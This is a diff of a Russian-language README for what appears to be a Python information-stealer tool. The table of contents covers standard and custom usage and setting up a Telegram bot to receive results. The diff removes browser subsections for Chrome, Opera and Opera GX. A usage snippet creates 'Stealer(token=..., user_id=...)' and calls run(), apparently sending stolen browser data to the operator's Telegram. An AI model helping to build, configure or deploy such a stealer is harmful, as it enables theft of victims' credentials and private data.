@@ -12,9 +12,6 @@
 * [Пример использования](#Пример-использования)
   * [Стандартный](#Стандартный)
   * [Кастомный](#Кастомный)
-    * [Chrome](#Chrome)
-    * [Opera](#Opera)
-    * [Opera GX](#Opera)
 * [Настройка Telegram бота](#Настройка-Telegram-бота)
   * [Получение токена](#Получение-токена)
   * [Получение айди](#Получение-айди)
@@ -45,7 +42,6 @@ stealer = Stealer(token="YOUR_TOKEN", user_id=YOUR_ID)
 stealer.run()
 ```
 ### Кастомный
-#### Chrome
 ```python
 from os import path, mkdir
 
